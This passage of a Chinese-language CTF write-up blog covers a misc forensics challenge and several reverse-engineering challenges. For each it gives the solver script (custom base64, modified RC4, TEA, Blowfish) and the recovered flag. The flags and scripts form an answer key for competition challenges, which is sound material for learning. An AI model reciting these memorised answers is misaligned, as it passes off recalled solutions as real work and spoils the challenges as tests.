<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Python">s = <br><span class="hljs-keyword">import</span> base64<br>result = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sort_by_numbers</span>(<span class="hljs-params">item</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(item[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rot22_encrypt</span>(<span class="hljs-params">text</span>):<br>    encrypted_text = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> text:<br>        <span class="hljs-keyword">if</span> char.isalpha():<br>            ascii_offset = <span class="hljs-number">65</span> <span class="hljs-keyword">if</span> char.isupper() <span class="hljs-keyword">else</span> <span class="hljs-number">97</span><br>            encrypted_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - ascii_offset + <span class="hljs-number">22</span>) % <span class="hljs-number">26</span> + ascii_offset)<br>            encrypted_text += encrypted_char<br>        <span class="hljs-keyword">else</span>:<br>            encrypted_text += char<br>    <span class="hljs-keyword">return</span> encrypted_text<br><br><br><span class="hljs-comment"># 打印结果</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        m = <span class="hljs-built_in">str</span>(base64.b64encode(rot22_encrypt(i).encode()))<br>        <span class="hljs-built_in">print</span>(m[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215675.png"></p>
<h2 id="misc-dacong-no-windows"><a href="#misc-dacong-no-windows" class="headerlink" title="misc-dacong_no_windows"></a>misc-dacong_no_windows</h2><p>使用Imdisk工具将dacong.raw在电脑上挂载，并使用diskgenius的恢复功能恢复出挂载映像中的文件</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215235.png"></p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215145.png"></p>
<p>flag有提示，分为三段，先找的flag2和flag3</p>
<p>得出的文件中flag2是个压缩包。</p>
<p>里面一句话</p>
<p>Once upon a time there were three girls, one with white hair, one with black hair, and one with green hair. In a cold winter, Xiao Bai and Xiao Hei hid Xiao Lu’s favorite green onions. Looking at the heavy <strong>snow</strong> outside the window, can you find where the green onions are?</p>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215637.png"></p>
<p>解出来_tHE_Dddd</p>
<p>flag3是U2FsdGVkX18M+E34cKJlmTU3uo1lHqjUQhKPTBGJiMjg4RWX6saTjOJmLU8653</p>
<p>base64之后发现有Salted__字样，aes，密码在注册表里</p>
<p>d@@Coong_LiiKEE FOr3NsIc</p>
<p>解出来是dAc0Ng_SIst3Rs????}</p>
<p>flag1在恢复出的图形类里</p>
<p>RX-sstv结合音频39（初音未来懂得都懂）</p>
<p>图片里面flag{Ar3_Th3Y</p>
<p>合起来flag{Ar3_Th3Y_tHE_DddddAc0Ng_SIst3Rs????}</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="mobilego"><a href="#mobilego" class="headerlink" title="mobilego"></a><strong>mobilego</strong></h2><ul>
<li>so的check看了一会比较难崩，但是看flag的密文形式很像简单位置替换</li>
<li>所以直接输编码表，jeb动调然后得到替换表</li>
<li>解密就行</li>
</ul>
<blockquote>
<p>flag密文的话有string.cmp，直接追踪资源就行</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Python">ori = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab&#x27;</span><br>key = <span class="hljs-string">&#x27;V8L3ObJT4PK2MYZFQBSHUCXWI0AGa51D679NER&#x27;</span><br>v =   <span class="hljs-string">&#x27;49021&#125;5f919038b440139g74b7Dc88330e5d&#123;6&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ori:<br>    <span class="hljs-built_in">print</span>(v[key.index(i)],end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># D0g3&#123;4c3b5903d11461f94478b7302980e958&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251217299.png"></p>
<h2 id="感觉有点点简单"><a href="#感觉有点点简单" class="headerlink" title="感觉有点点简单"></a><strong>感觉有点点简单</strong></h2><ul>
<li>文件sys挺吓人，实际就一个改了的RC4和base64，都不需要运行</li>
<li>base改了爆破就行了，逆还得动脑子</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">encode</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1, <span class="hljs-type">char</span> *a2, <span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-88h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+4h] [rbp-84h]</span><br>  <span class="hljs-type">char</span> table[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-78h] BYREF</span><br><br>  <span class="hljs-built_in">strcpy</span>(table, <span class="hljs-string">&quot;4KBbSzwWClkZ2gsr1qA+Qu0FtxOm6/iVcJHPY9GNp7EaRoDf8UvIjnL5MydTX3eh&quot;</span>);<br>  v4 = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( v4 &lt; len )<br>  &#123;<br>    a1[v5] = table[a2[v4] &amp; <span class="hljs-number">0x3F</span>];<br>    a1[v5 + <span class="hljs-number">1</span>] = table[(<span class="hljs-number">4</span> * (a2[v4 + <span class="hljs-number">1</span>] &amp; <span class="hljs-number">0xF</span>)) | ((a2[v4] &amp; <span class="hljs-number">0xC0</span>) &gt;&gt; <span class="hljs-number">6</span>)];<br>    a1[v5 + <span class="hljs-number">2</span>] = table[(<span class="hljs-number">16</span> * (a2[v4 + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">3</span>)) | ((a2[v4 + <span class="hljs-number">1</span>] &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>)];<br>    a1[v5 + <span class="hljs-number">3</span>] = table[(a2[v4 + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xFC</span>) &gt;&gt; <span class="hljs-number">2</span>];<br>    v4 += <span class="hljs-number">3</span>;<br>    v5 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( len % <span class="hljs-number">3</span> == <span class="hljs-number">1</span> )<br>  &#123;<br>    a1[v5 - <span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;=&#x27;</span>;<br>    a1[v5 - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;=&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( len % <span class="hljs-number">3</span> == <span class="hljs-number">2</span> )<br>  &#123;<br>    a1[v5 - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;=&#x27;</span>;<br>  &#125;<br>  string temp = <span class="hljs-string">&quot;4Uw=&quot;</span>;<br>  <span class="hljs-keyword">if</span> (temp[<span class="hljs-number">0</span>] == a1[<span class="hljs-number">0</span>] &amp;&amp; temp[<span class="hljs-number">1</span>] == a1[<span class="hljs-number">1</span>] &amp;&amp; temp[<span class="hljs-number">2</span>] == a1[<span class="hljs-number">2</span>] &amp;&amp; temp[<span class="hljs-number">3</span>] == a1[<span class="hljs-number">3</span>])&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  string t = <span class="hljs-string">&quot;4KBbSzwWClkZ2gsr1qA+Qu0FtxOm6/iVcJHPY9GNp7EaRoDf8UvIjnL5MydTX3eh&quot;</span>;<br>  <span class="hljs-type">char</span> a1[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">char</span> a2[<span class="hljs-number">2</span>] = &#123;&#125;;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">126</span>; i++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">126</span>; j++)&#123;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>;k &lt; <span class="hljs-number">126</span>; k++)&#123;<br>          a2[<span class="hljs-number">0</span>] = i;<br>          a2[<span class="hljs-number">1</span>] = j;<br>          <span class="hljs-keyword">if</span>(<span class="hljs-built_in">encode</span>(a1,a2,<span class="hljs-number">2</span>) == <span class="hljs-number">1</span>)&#123;<br>            cout &lt;&lt;(<span class="hljs-type">int</span>)a2[<span class="hljs-number">0</span>] &lt;&lt;<span class="hljs-string">&quot;,&quot;</span> &lt;&lt;(<span class="hljs-type">int</span>)a2[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-string">&quot;,&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br><br>&#125;<br><span class="hljs-comment">//92,33,123,51,81,51,56,40,58,43,48,64,22,44,51,37,54,4,56,70,81,60,37,74,19,51,57,59,105,39,77,41,51,20,51,70,48,49,50,64,108</span><br></code></pre></td></tr></table></figure>

<ul>
<li>RC4 64改写</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> longULONG;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">/*初始化函数*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_init</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*key, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> k[<span class="hljs-number">64</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">64</span>; i++)<br>    &#123;<br>        s[i] = i;<br>        k[i] = key[i%Len];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">64</span>; i++)<br>    &#123;<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">64</span>;<br>        tmp = s[i];<br>        s[i] = s[j];<br>        s[j] = tmp;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*加解密*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_crypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*Data, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp;<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k&lt;Len; k++)<br>    &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">64</span>;<br>        j = (j + s[i]) % <span class="hljs-number">64</span>;<br>        tmp = s[i];<br>        s[i] = s[j];<br>        s[j] = tmp;<br>        Data[k] ^= (i ^ j) &amp; s[(((i ^ j) + s[i] + s[j]) % <span class="hljs-number">64</span>)];<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> s[<span class="hljs-number">64</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">char</span> key[<span class="hljs-number">64</span>] = &#123;<span class="hljs-number">0x74</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x5F</span>&#125;;<br>    <span class="hljs-type">char</span> pData[<span class="hljs-number">512</span>] = &#123;<span class="hljs-number">92</span>,<span class="hljs-number">33</span>,<span class="hljs-number">123</span>,<span class="hljs-number">51</span>,<span class="hljs-number">81</span>,<span class="hljs-number">51</span>,<span class="hljs-number">56</span>,<span class="hljs-number">40</span>,<span class="hljs-number">58</span>,<span class="hljs-number">43</span>,<span class="hljs-number">48</span>,<span class="hljs-number">64</span>,<span class="hljs-number">22</span>,<span class="hljs-number">44</span>,<span class="hljs-number">51</span>,<span class="hljs-number">37</span>,<span class="hljs-number">54</span>,<span class="hljs-number">4</span>,<span class="hljs-number">56</span>,<span class="hljs-number">70</span>,<span class="hljs-number">81</span>,<span class="hljs-number">60</span>,<span class="hljs-number">37</span>,<span class="hljs-number">74</span>,<span class="hljs-number">19</span>,<span class="hljs-number">51</span>,<span class="hljs-number">57</span>,<span class="hljs-number">59</span>,<span class="hljs-number">105</span>,<span class="hljs-number">39</span>,<span class="hljs-number">77</span>,<span class="hljs-number">41</span>,<span class="hljs-number">51</span>,<span class="hljs-number">20</span>,<span class="hljs-number">51</span>,<span class="hljs-number">70</span>,<span class="hljs-number">48</span>,<span class="hljs-number">49</span>,<span class="hljs-number">50</span>,<span class="hljs-number">64</span>,<span class="hljs-number">108</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len = <span class="hljs-built_in">strlen</span>(pData);<br>    <span class="hljs-built_in">rc4_init</span>(s, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)key, <span class="hljs-built_in">strlen</span>(key));<br>    <span class="hljs-built_in">rc4_crypt</span>(s, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)pData, <span class="hljs-number">90</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,pData[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//D0g3&#123;608292C4-15400BA4-B3299A5C-704C292D&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h2><ul>
<li>有点可惜，但也正常，太久不看的人是这样的</li>
<li>动调call恢复function可以进入主逻辑，加密过程也很简单</li>
<li>就剩一张当时截的图，v5 &lt; 0，8个字节一组进行处理</li>
</ul>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215359.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">value, key</span>):<br>    <span class="hljs-keyword">assert</span> key &amp; <span class="hljs-number">1</span><br>    key |= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">if</span> value &amp; <span class="hljs-number">1</span>:<br>            value = (value ^ key) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            value = value &gt;&gt; <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> value<br><br>out = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;4db87629f5a99e595556b1c42f212c30b3797817a8edf7dbe153f0dbe903515e09c100dff096fcc1b5e6629501000000&#x27;</span>)<br>flag = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(out), <span class="hljs-number">8</span>):<br>    v = <span class="hljs-built_in">int</span>.from_bytes(out[i: i + <span class="hljs-number">8</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    flag += decrypt(v, <span class="hljs-number">0x54aa4a9</span>).to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h2 id="牢大想你了"><a href="#牢大想你了" class="headerlink" title="牢大想你了"></a><strong>牢大想你了</strong></h2><ul>
<li>混淆的挺好，下次别混淆了</li>
<li>manager&#x2F;data定位核心dll，dotpeek反编译</li>
<li>找到Tea的密文和密钥，直接解密【花里胡哨的没用代码一大坨】</li>
</ul>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251219516.PNG"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Python">void decrypt(unsigned <span class="hljs-built_in">int</span> v[], unsigned <span class="hljs-built_in">int</span> k[]) &#123;<br>    unsigned <span class="hljs-built_in">int</span> v0 = v[<span class="hljs-number">0</span>];<br>    unsigned <span class="hljs-built_in">int</span> v1 = v[<span class="hljs-number">1</span>];<br>    unsigned <span class="hljs-built_in">int</span> delta = <span class="hljs-number">2654435769</span>;<br>    unsigned <span class="hljs-built_in">int</span> sum1 = delta * <span class="hljs-number">32</span>;<br>    <span class="hljs-built_in">int</span> i;<br> <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>]) ^ (v0 + sum1) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>]);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>]) ^ (v1 + sum1) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>]);<br>        sum1 -= delta;<br>    &#125;<br> <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        printf(<span class="hljs-string">&quot;%c&quot;</span>, (v0 &gt;&gt; (<span class="hljs-number">8</span> * i)) &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        printf(<span class="hljs-string">&quot;%c&quot;</span>, (v1 &gt;&gt; (<span class="hljs-number">8</span> * i)) &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-built_in">int</span> main() &#123;<br>    unsigned <span class="hljs-built_in">int</span> data[] = &#123;<span class="hljs-number">3363017039</span>, <span class="hljs-number">1247970816</span>, <span class="hljs-number">549943836</span>, <span class="hljs-number">445086378</span>, <span class="hljs-number">3606751618</span>, <span class="hljs-number">1624361316</span>, <span class="hljs-number">3112717362</span>, <span class="hljs-number">705210466</span>,<br>                        <span class="hljs-number">3343515702</span>, <span class="hljs-number">2402214294</span>, <span class="hljs-number">4010321577</span>, <span class="hljs-number">2743404694</span>&#125;;<br>    unsigned <span class="hljs-built_in">int</span> key[] = &#123;<span class="hljs-number">286331153</span>, <span class="hljs-number">286331153</span>, <span class="hljs-number">286331153</span>, <span class="hljs-number">286331153</span>&#125;;<br>    <span class="hljs-built_in">int</span> i;<br> <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sizeof(data) / sizeof(unsigned <span class="hljs-built_in">int</span>); i += <span class="hljs-number">2</span>) &#123;<br>        decrypt(&amp;data[i], key);<br>    &#125;<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="你见过蓝色的小鲸鱼"><a href="#你见过蓝色的小鲸鱼" class="headerlink" title="你见过蓝色的小鲸鱼"></a>你见过蓝色的小鲸鱼</h2><ul>
<li>题目提示了blowfish加密，那么第一步要做的就是确认代码是否是一个正常的加密</li>
<li>然后密钥UzBtZTBuZV9EMGcz</li>
<li>密文dump出来：11A51F049550E2508F17E16CF1632B47</li>
<li>在线网站直接解密</li>
</ul>
<p><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/202312251215650.png"></p>
<p>D0g3{UzBtZTBuZV9EMGczQHRoZWJsdWVmMXNo}</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/04/24/text/">← Next Test</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/12/20/python%E9%80%86%E5%90%91/">python逆向基础知识 Prev →</a></div></div></div><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="INDEX">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://raw.githubusercontent.com/shimmer123456/img/main/img/touxiang.png" alt="Logo"></a><h1 id="Dr"><a href="/">shimmer</a></h1><div id="description"><p>一</p><p>些</p><p>小</p><p>笔</p><p>记</p><p>或</p><p>是</p><p>小</p><p>感</p><p>悟</p></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#side-channel-initiate"><span class="toc-number">1.1.</span> <span class="toc-text">side_channel , initiate!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Seccomp"><span class="toc-number">1.2.</span> <span class="toc-text">Seccomp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#what%E2%80%99s-my-name"><span class="toc-number">2.1.</span> <span class="toc-text">what’s my name</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-unserialize"><span class="toc-number">2.2.</span> <span class="toc-text">easy_unserialize</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#010101"><span class="toc-number">3.1.</span> <span class="toc-text">010101</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">4.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nahida"><span class="toc-number">4.2.</span> <span class="toc-text">Nahida</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%96%AF%E7%8B%82%E7%9A%84%E9%BA%A6%E5%85%8B%E6%96%AF"><span class="toc-number">4.3.</span> <span class="toc-text">疯狂的麦克斯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-dacong-no-windows"><span class="toc-number">4.4.</span> <span class="toc-text">misc-dacong_no_windows</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RE"><span class="toc-number">5.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mobilego"><span class="toc-number">5.1.</span> <span class="toc-text">mobilego</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%84%9F%E8%A7%89%E6%9C%89%E7%82%B9%E7%82%B9%E7%AE%80%E5%8D%95"><span class="toc-number">5.2.</span> <span class="toc-text">感觉有点点简单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PE"><span 